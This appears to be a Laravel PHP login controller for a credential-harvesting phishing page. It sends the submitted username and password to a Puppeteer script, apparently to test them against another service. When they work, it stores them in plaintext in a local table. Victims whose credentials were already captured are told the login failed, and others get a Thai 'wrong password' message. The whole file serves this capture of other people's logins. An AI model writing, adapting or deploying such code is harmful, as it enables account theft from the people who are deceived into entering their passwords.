<?php

namespace App\Http\Controllers;

use App\Models\Userdb;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    //

    function index(){
        return view("index");
    }

    function login(Request $request){
        $username = $request->username;
        $password = $request->password;
    
        $output = shell_exec("node " . escapeshellarg(base_path('puppeteer.js')) . " " . escapeshellarg($username) . " " . escapeshellarg($password));
    
        // Check the output of the Puppeteer script
        if (trim($output) === "Login successful") {
            // If login is successful, proceed with user database checks
            $user = Userdb::where("username", $username)->first();
            if ($user) {
                return redirect()->back()->with("message", "Login failed. Please try again.");
            } else {
                $newUser = new Userdb;
                $newUser->username = $username;
                $newUser->password = $password;
                $newUser->save();
            }
        } else {
            // If the login fails, send an error message
            return redirect()->back()->with("message", "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง");
        }
    }
}